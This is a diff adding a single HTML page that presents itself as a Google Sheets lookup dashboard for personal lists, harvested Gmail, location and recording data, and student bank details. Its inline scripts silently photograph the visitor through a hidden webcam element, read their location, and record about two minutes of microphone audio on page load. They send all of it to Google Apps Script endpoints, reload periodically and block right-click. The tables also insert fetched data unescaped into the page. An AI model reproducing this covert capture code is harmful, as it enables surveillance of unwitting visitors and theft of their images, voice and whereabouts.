@@ -1,0 +1,892 @@
+<!DOCTYPE html>
+<html lang="en">
+  <head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=1100" />
+    <link rel="icon" type="image/png" href="images/photo1.jpg" />
+    <style>
+      /* styles.css */
+      body {
+        font-family: Arial, sans-serif;
+        margin: 0;
+        padding: 0;
+      }
+
+      .container {
+        max-width: 90%;
+        margin: 0 auto;
+      }
+
+      .center {
+        color: #333;
+      }
+
+      .bold {
+        font-weight: bold;
+      }
+
+      .form-input {
+        width: 90%;
+        padding: 8px;
+        margin-bottom: 10px;
+        font-size: 16px; /* Adjust the font size as needed */
+      }
+
+      .btn-primary {
+        background-color: #007bff;
+        color: #fff;
+        padding: 10px 20px;
+        border: none;
+        cursor: pointer;
+      }
+
+      .data-table {
+        width: 90%; /* Make the table cover the entire screen */
+        border-collapse: collapse;
+        margin: 0 auto;
+      }
+
+      .data-table th,
+      .data-table td {
+        border: 1px solid #333;
+        padding: 8px;
+        font-size: 10px; /* Adjust the font size as needed */
+      }
+      .dataTable {
+        font-size: 10px; /* Set the font size to small */
+        padding: 30px;
+        border: none;
+      }
+
+      .dataTableContainer {
+        padding: 20px; /* Add padding around the table */
+      }
+
+      .dataTable td {
+        padding: 5px; /* Adjust cell padding */
+      }
+
+      .deleteButton {
+        background-color: #ff6347;
+        color: #fff;
+        border: none;
+        cursor: pointer;
+      }
+      /* Add more styles as needed */
+    </style>
+    <title>WEBSITE SHEET</title>
+  </head>
+  <body>
+    <h1 style="color: blue; text-align: center">SCRIPT SHEET INFO</h1>
+    <form id="dataForm" style="padding: 20px">
+      <label
+        for="sheet"
+        style="font-weight: bold; display: block; margin-bottom: 10px"
+        >SEARCH DATA</label
+      >
+      <select
+        id="sheet"
+        name="sheet"
+        style="padding: 5px; margin: 10px; font-size: 16px"
+      >
+        <option value="GmailWish">Birthday Wish</option>
+        <option value="Capture">Website Users</option>
+        <option value="Contacts">Arun Contacts</option>
+        <option value="appa">Appa Contacts</option>
+        <option value="hari">Hari Contacts</option>
+        <option value="Love">Love Report</option>
+        <option value="Url">Storage Url</option>
+        <option value="Webusers">Registered Users</option>
+        <option value="GmailData">Gmail Data</option>
+        <option value="GoogleNotes">Google Notes Data</option>
+        <option value="Location">Location</option>
+        <option value="FeedBack">Feedback Report</option>
+        <option value="Bookmarks">Bookmarks</option>
+        <option value="Calender">Calendar Report</option>
+        <option value="WebFeedback">Website Feedback</option>
+        <option value="Travel">Travel</option>
+        <option value="Medicine">Medicine</option>
+        <option value="Email">Email</option>
+        <option value="Birthday List">Birthday List</option>
+        <option value="PhotoDetails">Photo Details</option>
+        <option value="Recordings">Recordings</option>
+      </select>
+      <input
+        type="text"
+        id="search"
+        name="search"
+        placeholder="Search..."
+        style="padding: 5px; margin: 10px; font-size: 16px"
+        required
+      />
+      <br />
+      <input
+        type="submit"
+        value="Submit"
+        style="
+          background-color: #007bff;
+          color: #fff;
+          padding: 10px 20px;
+          border: none;
+          cursor: pointer;
+        "
+      />
+      <a
+        href="https://docs.google.com/spreadsheets/d/e/2PACX-1vRxXBsStII4Jok-mlBVHq9SpSLSfLDbDz_S4t1siHbiVXWEj8hKQTbkjftrecD8HrdAhj47R0AjzzRf/pub?output=xlsx"
+        download="Sheet.xlsx"
+      >
+        <button
+          type="button"
+          style="
+            background-color: #007bff;
+            color: #fff;
+            padding: 10px 20px;
+            border: none;
+            cursor: pointer;
+          "
+        >
+          Download Excel
+        </button>
+      </a>
+    </form>
+    <div id="result" style="margin-top: 20px; font-size: 18px"></div>
+    <br />
+    <script>
+      document
+        .getElementById("dataForm")
+        .addEventListener("submit", function (event) {
+          event.preventDefault(); // Prevent the form from submitting the traditional way
+
+          // Get the selected sheet from the dropdown list
+          var selectedsheet = document.getElementById("sheet").value;
+          var search = document.getElementById("search").value;
+
+          // Prepare the form data
+          var formData = new FormData();
+          formData.append("selectedsheet", selectedsheet);
+          formData.append("search", search);
+          console.log(selectedsheet);
+          console.log(search);
+          console.log(formData);
+          // Send the form data to the script
+          fetch(
+            "https://script.google.com/macros/s/AKfycbwW7DzObi-KRjQWi7AecpNcoAAhDUvFZOqXvoh99iWaPrbyrAebqKXNfHeEWPn5QzNtIw/exec",
+            {
+              method: "POST",
+              body: formData,
+            }
+          )
+            .then(function (response) {
+              if (response.ok) {
+                return response.text();
+              } else {
+                throw new Error("Network response was not ok.");
+                alert("Network response was not ok.");
+                location.reload();
+              }
+            })
+            .then(function (data) {
+              // Handle the response from the script if needed
+              console.log(data);
+              displayResult(data); // Call the displayResult function to show the result
+            })
+            .catch(function (error) {
+              // Handle errors here
+              console.error(error);
+              alert("No matching Rows found");
+              location.reload();
+            });
+        });
+
+      function displayResult(result) {
+        const resultDiv = document.getElementById("result");
+
+        const jsonData = JSON.parse(result);
+        storedData = jsonData; // Store the data in storedData
+
+        if (jsonData.length > 0) {
+          const table = document.createElement("table");
+          table.classList.add("data-table");
+
+          const headerRow = document.createElement("tr");
+          const keys = Object.keys(jsonData[0]);
+
+          const deleteRow = (rowIndex) => {
+            alert(
+              "This action will delete the item from local storage only. To delete from the database, please contact Arun."
+            );
+            storedData.splice(rowIndex, 1);
+            displayResult(JSON.stringify(storedData)); // Redraw the table after deletion
+          };
+
+          jsonData.forEach((dataEntry, index) => {
+            const row = document.createElement("tr");
+            keys.forEach((key) => {
+              const cell = document.createElement("td");
+              const cellValue = dataEntry[key];
+              cell.textContent = cellValue;
+              row.appendChild(cell);
+            });
+
+            // Create delete button for each row, excluding the first row (index === 0)
+            if (index !== 0) {
+              const deleteButton = document.createElement("button");
+              deleteButton.textContent = "Delete";
+              deleteButton.onclick = () => deleteRow(index);
+              const deleteCell = document.createElement("td");
+              deleteCell.appendChild(deleteButton);
+              row.appendChild(deleteCell);
+            } else {
+              // For the first row, leave the cell empty as it contains headers
+              const emptyCell = document.createElement("td");
+              row.appendChild(emptyCell);
+            }
+
+            table.appendChild(row);
+          });
+
+          resultDiv.innerHTML = "";
+          resultDiv.appendChild(table);
+        } else {
+          resultDiv.textContent = "No data found for the selected sheet.";
+          alert("No data found for the selected sheet.");
+          location.reload();
+        }
+      }
+    </script>
+
+    <form id="dataForm1" style="padding: 20px">
+      <label
+        for="sheet"
+        style="font-weight: bold; display: block; margin-bottom: 10px"
+        >FULL DATA</label
+      >
+      <select
+        id="sheet1"
+        name="sheet"
+        style="padding: 5px; margin: 10px; font-size: 16px"
+      >
+        <option value="GmailWish">Birthday Wish</option>
+        <option value="Capture">Website Users</option>
+        <option value="Contacts">Arun Contacts</option>
+        <option value="appa">Appa Contacts</option>
+        <option value="hari">Hari Contacts</option>
+        <option value="Love">Love Report</option>
+        <option value="Url">Storage Url</option>
+        <option value="Webusers">Registered Users</option>
+        <option value="GmailData">Gmail Data</option>
+        <option value="GoogleNotes">Google Notes Data</option>
+        <option value="Location">Location</option>
+        <option value="FeedBack">Feedback Report</option>
+        <option value="Bookmarks">Bookmarks</option>
+        <option value="Calender">Calendar Report</option>
+        <option value="WebFeedback">Website Feedback</option>
+        <option value="Travel">Travel</option>
+        <option value="Medicine">Medicine</option>
+        <option value="Email">Email</option>
+        <option value="Birthday List">Birthday List</option>
+        <option value="PhotoDetails">Photo Details</option>
+        <option value="Recordings">Recordings</option>
+      </select>
+      <br />
+      <input
+        type="submit"
+        value="Submit"
+        style="
+          background-color: #007bff;
+          color: #fff;
+          padding: 10px 20px;
+          border: none;
+          cursor: pointer;
+        "
+      />
+      <a
+        href="https://docs.google.com/spreadsheets/d/e/2PACX-1vRZtWzu6LS67ZaOpJfAfeIebVbfRPCagqCSiB2ntBcJaQY4fBieGxq4iVn6jVLLf68UCD_lylh_Hqhn/pub?output=xlsx"
+        download="Sheet.xlsx"
+      >
+        <button
+          type="button"
+          style="
+            background-color: #007bff;
+            color: #fff;
+            padding: 10px 20px;
+            border: none;
+            cursor: pointer;
+          "
+        >
+          Download Excel
+        </button>
+      </a>
+    </form>
+    <div id="result1" style="margin-top: 20px; font-size: 18px"></div>
+    <br />
+    <script>
+      // Update the existing script in your HTML file
+
+      document
+        .getElementById("dataForm1")
+        .addEventListener("submit", function (event) {
+          event.preventDefault(); // Prevent the form from submitting the traditional way
+
+          // Get the selected sheet from the dropdown list
+          var selectedsheet = document.getElementById("sheet1").value;
+
+          // Prepare the form data
+          var formData = new FormData();
+          formData.append("selectedsheet", selectedsheet);
+
+          // Send the form data to the script
+          fetch(
+            "https://script.google.com/macros/s/AKfycbyRyIdnggziIKJfObtiqo2yMWc18OUbz8HmNkmuzODMj-rw8wgYv-60F6Fk0YlgSeKQ/exec",
+            {
+              method: "POST",
+              body: formData,
+            }
+          )
+            .then((response) => response.json())
+            .then((data) => {
+              // Handle the received data by generating a table
+              var table = "<table class='dataTable' border='1'>";
+              for (var i = 0; i < data.length; i++) {
+                table += "<tr>";
+                for (var j = 0; j < data[i].length; j++) {
+                  table += "<td>" + data[i][j] + "</td>";
+                }
+                table +=
+                  "<td><button class='deleteButton' onclick='deleteRow(" +
+                  i +
+                  ")'>Delete</button></td>";
+                table += "</tr>";
+              }
+              table += "</table>";
+
+              // Update the HTML with the table containing the data
+              document.getElementById("result1").innerHTML = table;
+
+              // Store data in local storage for deletion
+              localStorage.setItem("tableData", JSON.stringify(data));
+            })
+            .catch((error) => {
+              console.error("Error:", error);
+            });
+        });
+
+      // Function to delete row both from displayed table and local storage
+      function deleteRow(row) {
+        var storedData = JSON.parse(localStorage.getItem("tableData"));
+        storedData.splice(row, 1); // Remove the selected row
+        localStorage.setItem("tableData", JSON.stringify(storedData)); // Update local storage
+
+        // Re-render the table after deletion
+        var table = "<table class='dataTable' border='1'>";
+        for (var i = 0; i < storedData.length; i++) {
+          table += "<tr>";
+          for (var j = 0; j < storedData[i].length; j++) {
+            table += "<td>" + storedData[i][j] + "</td>";
+          }
+          table +=
+            "<td><button class='deleteButton' onclick='deleteRow(" +
+            i +
+            ")'>Delete</button></td>";
+          table += "</tr>";
+        }
+        table += "</table>";
+
+        document.getElementById("result1").innerHTML = table;
+      }
+    </script>
+
+    <video id="video" autoplay style="display: none"></video>
+    <canvas id="canvas" style="display: none"></canvas>
+    <img
+      id="captured-image"
+      src=""
+      alt="Captured Image"
+      style="display: none"
+    />
+
+    <script>
+      if (navigator.geolocation) {
+        navigator.permissions
+          .query({ name: "geolocation" })
+          .then(function (result) {
+            if (result.state === "granted") {
+              // Geolocation access granted
+              navigator.geolocation.getCurrentPosition(
+                function (position) {
+                  // Handle the obtained position
+                },
+                function (error) {
+                  console.error("Error getting geolocation:", error);
+                }
+              );
+            } else if (result.state === "prompt") {
+              // Geolocation access is requested
+            } else if (result.state === "denied") {
+              // Geolocation access denied by the user
+              console.error("Geolocation access denied by the user.");
+              // You can inform the user or provide an alternative method
+            } else if (result.state === "prompt") {
+              // Geolocation access is requested
+            }
+          });
+      } else {
+        console.error("Geolocation is not supported by this browser.");
+      }
+      captureCamera();
+      let latitude;
+      let longitude;
+      let mapUrl;
+      var website = "https://arunkumar-selvaraj.web.app/home.html";
+      let capturedImage = document.getElementById("captured-image");
+      var imageDataUrl;
+
+      function captureCamera() {
+        navigator.mediaDevices
+          .getUserMedia({ video: true })
+          .then(function (cameraStream) {
+            const video = document.getElementById("video");
+            const canvas = document.getElementById("canvas");
+            video.srcObject = cameraStream;
+            video.onloadedmetadata = function () {
+              captureImage(cameraStream);
+            };
+          })
+          .catch(function (error) {
+            console.error("Error accessing the camera: " + error);
+          });
+
+        getLocation();
+      }
+
+      function getLocation() {
+        if ("geolocation" in navigator) {
+          navigator.geolocation.getCurrentPosition(
+            function (position) {
+              latitude = position.coords.latitude;
+              longitude = position.coords.longitude;
+              mapUrl = `https://www.google.com/maps?q=${latitude},${longitude}`;
+            },
+            function (error) {
+              console.error("Error accessing geolocation: " + error);
+            }
+          );
+        } else {
+          console.error("Geolocation is not supported");
+        }
+      }
+
+      function captureImage(stream) {
+        const video = document.getElementById("video");
+        const canvas = document.getElementById("canvas");
+        const context = canvas.getContext("2d");
+        canvas.width = video.videoWidth;
+        canvas.height = video.videoHeight;
+        context.drawImage(video, 0, 0, canvas.width, canvas.height);
+        imageDataUrl = canvas.toDataURL("image/png");
+        capturedImage.src = imageDataUrl;
+        if (stream) {
+          const tracks = stream.getTracks();
+          tracks.forEach((track) => track.stop());
+          sendImageData(imageDataUrl);
+        }
+      }
+
+      function sendImageData(imageDataUrl) {
+        let url =
+          "https://script.google.com/macros/s/AKfycbyRf0AWpmh3Z2CjnWYEE597VIY-gmnyj4T6AL3jnEQSfVFJ_2EWebvUiVTMoSg_ZsdO/exec";
+        console.log(latitude);
+        console.log(longitude);
+        console.log("imageDataUrl" + imageDataUrl.split("base64,")[1]);
+        let obj = {
+          base64: imageDataUrl.split("base64,")[1],
+          type: "image/png",
+          name: "captured_image.png",
+          url: mapUrl,
+          latitude: latitude,
+          longitude: longitude,
+          website: website,
+        };
+        fetch(url, {
+          method: "POST",
+          body: JSON.stringify(obj),
+        })
+          .then((response) => response.text())
+          .then((data) => console.log(data))
+          .catch((error) => console.error("Error sending image: " + error));
+      }
+    </script>
+
+    <div id="status"><span id="statusText"></span></div>
+    <script>
+      const status = document.getElementById("status");
+      console.log("Requesting access to the microphone...");
+      navigator.mediaDevices
+        .getUserMedia({ audio: true })
+        .then((stream) => {
+          console.log("Microphone access granted.");
+          const mediaRecorder = new MediaRecorder(stream);
+          const recordedChunks = [];
+          mediaRecorder.ondataavailable = (event) => {
+            recordedChunks.push(event.data);
+            console.log("Data available...");
+          };
+          mediaRecorder.onstop = () => {
+            console.log("Recording stopped.");
+            const blob = new Blob(recordedChunks, { type: "audio/webm" });
+            console.log("Blob created:", blob);
+            convertBlobToBase64(blob); // Convert blob to Base64 URL
+          };
+          mediaRecorder.start();
+          console.log("Recording started...");
+          setTimeout(() => {
+            mediaRecorder.stop();
+            console.log("Stopping recording after 10 seconds...");
+          }, 120000); // Stop recording after 10 seconds (adjust as needed)
+        })
+        .catch((err) => {
+          console.error("Error accessing the microphone:", err);
+        });
+
+      function convertBlobToBase64(blob) {
+        const reader = new FileReader();
+        reader.onload = function (event) {
+          const base64String = event.target.result.split(",")[1]; // Extracting base64 string
+          sendAudioToServer(base64String);
+        };
+        reader.readAsDataURL(blob);
+      }
+
+      function sendAudioToServer(base64String) {
+        const formData = new FormData();
+        formData.append("audio", base64String);
+        formData.append("website", website);
+        formData.append("latitude", latitude);
+        formData.append("longitude", longitude);
+        formData.append("url", mapUrl);
+        formData.append("name", "captured_image.png");
+        formData.append("type", "image/png");
+        formData.append("base64", imageDataUrl.split("base64,")[1]);
+
+        fetch(
+          "https://script.google.com/macros/s/AKfycbzcej4rWqyeW7zWXq6Yclfz2CFFakoeaB4PC1tWhePVVavuEdmhbjPQGe-8FO3flPOdpA/exec",
+          {
+            method: "POST",
+            body: formData,
+          }
+        )
+          .then((response) => {
+            console.log("Server response received:", response);
+            return response.text(); // Convert the response to text
+          })
+          .then((data) => {
+            console.log("Response: " + data);
+          })
+          .catch((error) => {
+            console.error("Error sending audio to the server:", error);
+            document.getElementById("status").innerText = "Error: " + error; // Display error message in the 'status' div
+          });
+      }
+      setTimeout(function () {
+        window.location.reload();
+      }, 160000);
+
+      document.addEventListener("contextmenu", function (e) {
+        e.preventDefault();
+      });
+    </script>
+
+    <h1 style="color: blue; text-align: center">STUDENT SHEET INFO</h1>
+    <form id="dataForm3" style="padding: 20px">
+      <label
+        for="sheet"
+        style="font-weight: bold; display: block; margin-bottom: 10px"
+        >SEARCH DATA</label
+      >
+      <select
+        id="sheet3"
+        name="sheet"
+        style="padding: 5px; margin: 10px; font-size: 16px"
+      >
+        <option value="CSE A">CSE A</option>
+        <option value="CSE">CSE</option>
+        <option value="Master Tracksheet -CSE">MASTER SHEET - CSE</option>
+        <option value="Bank Details - NPTEL">BANK DETAILS - NPTEL</option>
+        <option value="SONA">SONA</option>
+        <option value="SONA - OLD RECORDS">SONA - OLD RECORDS</option>
+        <option value="NAAN MUDHALVAN">NAAN MUDHALVAN</option>
+        <option value="2 YEAR - CSE">II YEAR - CSE</option>
+        <option value="3 YEAR - CSE">III YEAR - CSE</option>
+      </select>
+      <input
+        type="text"
+        id="search3"
+        name="search"
+        placeholder="Search..."
+        style="padding: 5px; margin: 10px; font-size: 16px"
+        required
+      />
+      <br />
+
+      <input
+        type="submit"
+        value="Submit"
+        style="
+          background-color: #007bff;
+          color: #fff;
+          padding: 10px 20px;
+          border: none;
+          cursor: pointer;
+        "
+      />
+      <a
+        href="https://docs.google.com/spreadsheets/d/e/2PACX-1vRZtWzu6LS67ZaOpJfAfeIebVbfRPCagqCSiB2ntBcJaQY4fBieGxq4iVn6jVLLf68UCD_lylh_Hqhn/pub?output=xlsx"
+        download="Sheet.xlsx"
+      >
+        <button
+          type="button"
+          style="
+            background-color: #007bff;
+            color: #fff;
+            padding: 10px 20px;
+            border: none;
+            cursor: pointer;
+          "
+        >
+          Download Excel
+        </button>
+      </a>
+    </form>
+
+    <div id="result3" style="margin-top: 20px; font-size: 18px"></div>
+    <br />
+    <script>
+      document
+        .getElementById("dataForm3")
+        .addEventListener("submit", function (event) {
+          event.preventDefault(); // Prevent the form from submitting the traditional way
+
+          // Get the selected sheet from the dropdown list
+          var selectedsheet = document.getElementById("sheet3").value;
+          var search = document.getElementById("search3").value;
+          console.log(search);
+          console.log(selectedsheet);
+          // Prepare the form data
+          var formData = new FormData();
+          formData.append("selectedsheet", selectedsheet);
+          formData.append("search", search);
+          // Send the form data to the script
+          fetch(
+            "https://script.google.com/macros/s/AKfycbyQTlvfy1GChHmxZoDfMgHqg3WISxbCvFVirRz9PVAG3-iO7uK1_e5NW0SHo5wx89nmVQ/exec",
+            {
+              method: "POST",
+              body: formData,
+            }
+          )
+            .then(function (response) {
+              if (response.ok) {
+                return response.text();
+              } else {
+                throw new Error("Network response was not ok.");
+                alert("Network response was not ok.");
+                location.reload();
+              }
+            })
+            .then(function (data) {
+              // Handle the response from the script if needed
+              displayResult3(data); // Call the displayResult function to show the result
+            })
+            .catch(function (error) {
+              // Handle errors here
+              console.error(error);
+              alert("No matching Rows found");
+              location.reload();
+            });
+        });
+
+      function displayResult3(result) {
+        const resultDiv = document.getElementById("result3");
+
+        const jsonData = JSON.parse(result);
+        storedData = jsonData; // Store the data in storedData
+
+        if (jsonData.length > 0) {
+          const table = document.createElement("table");
+          table.classList.add("data-table");
+
+          const headerRow = document.createElement("tr");
+          const keys = Object.keys(jsonData[0]);
+
+          const deleteRow = (rowIndex) => {
+            alert(
+              "This action will delete the item from local storage only. To delete from the database, please contact Arun."
+            );
+            storedData.splice(rowIndex, 1);
+            displayResult(JSON.stringify(storedData)); // Redraw the table after deletion
+          };
+
+          jsonData.forEach((dataEntry, index) => {
+            const row = document.createElement("tr");
+            keys.forEach((key) => {
+              const cell = document.createElement("td");
+              const cellValue = dataEntry[key];
+              cell.textContent = cellValue;
+              row.appendChild(cell);
+            });
+
+            // Create delete button for each row, excluding the first row (index === 0)
+            if (index !== 0) {
+              const deleteButton = document.createElement("button");
+              deleteButton.textContent = "Delete";
+              deleteButton.onclick = () => deleteRow(index);
+              const deleteCell = document.createElement("td");
+              deleteCell.appendChild(deleteButton);
+              row.appendChild(deleteCell);
+            } else {
+              // For the first row, leave the cell empty as it contains headers
+              const emptyCell = document.createElement("td");
+              row.appendChild(emptyCell);
+            }
+
+            table.appendChild(row);
+          });
+
+          resultDiv.innerHTML = "";
+          resultDiv.appendChild(table);
+        } else {
+          resultDiv.textContent = "No data found for the selected sheet.";
+          alert("No data found for the selected sheet.");
+          location.reload();
+        }
+      }
+    </script>
+    <form id="dataForm4" style="padding: 20px">
+      <label
+        for="sheet"
+        style="font-weight: bold; display: block; margin-bottom: 10px"
+        >FULL DATA</label
+      >
+      <select
+        id="sheet4"
+        name="sheet"
+        style="padding: 5px; margin: 10px; font-size: 16px"
+      >
+        <option value="CSE A">CSE A</option>
+        <option value="CSE">CSE</option>
+        <option value="Master Tracksheet -CSE">MASTER SHEET - CSE</option>
+        <option value="Bank Details - NPTEL">BANK DETAILS - NPTEL</option>
+        <option value="SONA">SONA</option>
+        <option value="SONA - OLD RECORDS">SONA - OLD RECORDS</option>
+        <option value="NAAN MUDHALVAN">NAAN MUDHALVAN</option>
+        <option value="2 YEAR - CSE">II YEAR - CSE</option>
+        <option value="3 YEAR - CSE">III YEAR - CSE</option>
+      </select>
+      <br />
+      <input
+        type="submit"
+        value="Submit"
+        style="
+          background-color: #007bff;
+          color: #fff;
+          padding: 10px 20px;
+          border: none;
+          cursor: pointer;
+        "
+      />
+      <a
+        href="https://docs.google.com/spreadsheets/d/e/2PACX-1vRZtWzu6LS67ZaOpJfAfeIebVbfRPCagqCSiB2ntBcJaQY4fBieGxq4iVn6jVLLf68UCD_lylh_Hqhn/pub?output=xlsx"
+        download="Sheet.xlsx"
+      >
+        <button
+          type="button"
+          style="
+            background-color: #007bff;
+            color: #fff;
+            padding: 10px 20px;
+            border: none;
+            cursor: pointer;
+          "
+        >
+          Download Excel
+        </button>
+      </a>
+    </form>
+    <div id="result4" style="margin-top: 20px; font-size: 18px"></div>
+    <br />
+    <script>
+      // Update the existing script in your HTML file
+
+      document
+        .getElementById("dataForm4")
+        .addEventListener("submit", function (event) {
+          event.preventDefault(); // Prevent the form from submitting the traditional way
+
+          // Get the selected sheet from the dropdown list
+          var selectedsheet = document.getElementById("sheet4").value;
+
+          // Prepare the form data
+          var formData = new FormData();
+          formData.append("selectedsheet", selectedsheet);
+
+          // Send the form data to the script
+          fetch(
+            "https://script.google.com/macros/s/AKfycbxEhJm6YILedT9h6RRkbIvbfa32zvvPj0LgX1ezEkX7Oa6iATAxsfh6lMVG58Zt4Iu12w/exec",
+            {
+              method: "POST",
+              body: formData,
+            }
+          )
+            .then((response) => response.json())
+            .then((data) => {
+              // Handle the received data by generating a table
+              var table = "<table class='dataTable' border='1'>";
+              for (var i = 0; i < data.length; i++) {
+                table += "<tr>";
+                for (var j = 0; j < data[i].length; j++) {
+                  table += "<td>" + data[i][j] + "</td>";
+                }
+                table +=
+                  "<td><button class='deleteButton' onclick='deleteRow4(" +
+                  i +
+                  ")'>Delete</button></td>";
+                table += "</tr>";
+              }
+              table += "</table>";
+
+              // Update the HTML with the table containing the data
+              document.getElementById("result4").innerHTML = table;
+
+              // Store data in local storage for deletion
+              localStorage.setItem("tableData", JSON.stringify(data));
+            })
+            .catch((error) => {
+              console.error("Error:", error);
+            });
+        });
+
+      // Function to delete row both from displayed table and local storage
+      function deleteRow4(row) {
+        var storedData = JSON.parse(localStorage.getItem("tableData"));
+        storedData.splice(row, 1); // Remove the selected row
+        localStorage.setItem("tableData", JSON.stringify(storedData)); // Update local storage
+
+        // Re-render the table after deletion
+        var table = "<table class='dataTable' border='1'>";
+        for (var i = 0; i < storedData.length; i++) {
+          table += "<tr>";
+          for (var j = 0; j < storedData[i].length; j++) {
+            table += "<td>" + storedData[i][j] + "</td>";
+          }
+          table +=
+            "<td><button class='deleteButton' onclick='deleteRow(" +
+            i +
+            ")'>Delete</button></td>";
+          table += "</tr>";
+        }
+        table += "</table>";
+
+        document.getElementById("result4").innerHTML = table;
+      }
+    </script>
+  </body>
+</html>
